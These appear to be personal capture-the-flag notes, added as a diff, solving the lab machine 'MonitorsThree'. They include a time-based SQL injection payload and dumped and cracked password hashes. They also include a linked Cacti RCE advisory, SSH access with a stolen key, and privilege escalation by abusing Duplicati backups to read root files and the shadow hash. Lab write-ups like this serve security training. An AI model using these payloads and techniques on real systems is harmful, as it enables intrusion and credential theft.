@@ -1,0 +1,100 @@
+monitorsthree
+
+nmap -> 22, 80 port. [ 22 -> secure SSH ] [ 80 -> server ]
+
+80:
+	- There is /login
+	- There is /forgot_password
+	- There is /admin
+	- Uses php session cookie
+
+- No SQL injection in login
+- Time based SQL injection in /forgot_password "username" parameter
+- Sql injection query: ' AND (SELECT 7886 FROM (SELECT(SLEEP(1)))vrpI) AND 'IpTz'='IpTz
+
+	available databases [2]:
+	[*] information_schema
+	[*] monitorsthree_db
+
+Database: monitorsthree_db
+[6 tables]
++---------------+
+| changelog     |
+| invoice_tasks |
+| invoices      |
+| iustomers     |
+| tasks         |
+| users         |
++---------------+
+
+users:
+	-id
+	-username
+	-password
+	-dob
+	-email
+	-name 
+	----3 more but I needed username and password to login
+
+	Database: monitorsthree_db
+	Table: users
+	[2 columns]
+	+----------+--------------+
+	| Column   | Type         |
+	+----------+--------------+
+	| password | varchar(100) |
+	| username | varchar(50)  |
+	+----------+--------------+
+
+	Database: monitorsthree_db
+	Table: users
+	[4 entries]
+	+-----------+----------------------------------+
+	| username  | password                         |
+	+-----------+----------------------------------+
+	| janderson | 1e68b6eb86b45f6d92f8f292428f77ac |
+	| admin     | 31a181c8372e3afc59dab863430610e8 |
+	| dthompson | 633b683cc128fe244b00f176c8a950f5 |
+	| mwatson   | c585d01f2eb3e6e1073e92023088a3dd |
+	+-----------+----------------------------------+
+
+	Hashes are md5 or 0 in hashcat. admin:greencacti2001
+	Not cracked -> janderson,dthompson,mwatson
+
+Subdomain: http://cacti.monitorsthree.htb/
+ffuf -u http://monitorsthree.htb -H "HOST:FUZZ.monitorsthree.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fw 3598
+
+
+exploit RCE: https://github.com/Cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88
+
+Dumped the entire cacti database sql
+Opened the dump sql to find table auth_user with bcrypt hashes and cracked for marcus -> $2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK:12345678910
+
+ [ admin:$2y$10$tjPSsSP6UovL3OTNeam4Oe24TSRuSRRApmqf5vPinSer3mDuyG90G ] not cracked
+
+marcus:12345678910
+
+Got user.txt: 579992de12129726ae28b81e98ab3332
+
+Got marcus id_rsa and ssh for marcus for better shell: ssh -i marcus_id_rsa marcus@10.129.44.72
+
+
+Priv Esc:
+	marcus@monitorsthree:/var/www/html/cacti$ ls -l /etc/cron.d/
+	total 24
+	-rw-r--r-- 1 root root  67 May 18 21:47 cacti
+	-rw-r--r-- 1 root root  46 May 20 17:30 cleanup_cacti
+	-rw-r--r-- 1 root root  47 May 21 16:24 cleanup_cron
+	-rw-r--r-- 1 root root  69 Aug 18 10:18 duplicati
+	-rw-r--r-- 1 root root 201 Jan  8  2022 e2scrub_all
+	-rw-r--r-- 1 root root 712 Jan  9  2024 php
+
+Duplicati port forwarding 8200
+
+Edit the existing running backup to include root.txt from root -> cacti 1.2.26 Backup
+
+After that restore to any readable file and we got it
+
+Got root.txt: 98c0a0b8f765da96ecd426087c2bff5d
+
+Got root shadow file password: root:$y$j9T$3TDQ3GS5lSkNwiN4EsxVB/$Jyu3CWLTQ4mIypw/03JOtPle6vdpaoY/x6J9brbV9P4:19869:0:99999:7:::
